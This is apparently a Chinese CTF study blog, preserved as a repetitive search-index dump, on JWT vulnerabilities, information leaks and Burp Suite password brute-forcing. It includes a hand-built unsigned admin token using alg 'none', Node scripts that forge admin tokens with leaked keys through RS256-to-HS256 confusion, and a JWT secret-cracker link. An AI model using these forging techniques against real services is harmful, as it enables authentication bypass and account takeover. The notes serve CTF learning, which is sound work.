在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#jwt漏洞"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#空加密算法"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#密钥爆破"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#私钥泄露攻击"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#公钥泄露攻击"},{"categories":["notes"],"content":"\r认识漏洞","date":"2022-09-20","objectID":"/web_base-2022.9/:5:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#认识漏洞"},{"categories":["notes"],"content":"\r0x1什么是漏洞？本质上是对现有信息资产的非预期使用，用户通过技术手段访问或者修改到不应该访问到的数据，执行不应执行的代码。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x1什么是漏洞"},{"categories":["notes"],"content":"\r0x2漏洞产生的原因：设计缺陷、逻辑错误，代码bug、越权漏洞、其他漏洞 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x2漏洞产生的原因"},{"categories":["notes"],"content":"\r0x3漏洞的利用方式\r危害程度： ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x3漏洞的利用方式"},{"categories":["notes"],"content":"\r0x4 web题目的做题思路读取flag信息 （判断漏洞类型） ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:4","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x4-web题目的做题思路"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x6信息泄露漏洞利用"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#1http头信息泄露"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#2报错信息泄露"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#3页面信息泄露"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#4robotstxt敏感文件泄露"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#5git文件泄露"},{"categories":["notes"],"content":"\r0x7Burpsuite与爆破(没时间补笔记了，一下内容来自charmersix.icu) 抓包，爆破 bp的安装，Java环境，proxy插件 设置好代理，开启拦截，刷新一下你的浏览器就可以看见抓到的包 这里我们以bugku的一个题目为例子，演示一下使用bp进行爆破 题目链接 现在我们打开题目，开启拦截 然后我们往里填一个自己猜的密码，比如我这里是123456 点提交，就能看见自己抓的包 这里可以看见我们已经抓到了，我们点鼠标右键，发送到intruder 来到位置这里，我们可以把admin位置删掉，因为一开始admin给出了，不需要我们爆破 只需要删除admin两边的§符号即可 我们继续看下一栏 这里选择简单列表即可，然后导入我们从网上下载的top1000密码，开始爆破 失败 通过观察相应包，我们发现，无论是否爆破成功，这里都会通过js告诉你爆破失败 那我么只需要过滤掉{code: 'bugku10000'}就能知道，到底哪个是真正被爆破成功的 然后爆破，就能出密码 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:6","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x7burpsuite与爆破"},{"categories":null,"content":"\rAbout meQLUT B.C.S in reading ID:Sc0fie1d ","date":"2019-08-02","objectID":"/about/:0:1","series":null,"tags":null,"title":"About","uri":"/about/#about-me"},{"categories":null,"content":"\rContactEmail: scofield_1920@outlook.com ","date":"2019-08-02","objectID":"/about/:0:2","series":null,"tags":null,"title":"About","uri":"/about/#contact"},{"categories":null,"content":" You are not connected to the Internet, only cached pages will be available. ","date":"0001-01-01","objectID":"/offline/:0:0","series":null,"tags":null,"title":"Offline","uri":"/offline/#"}]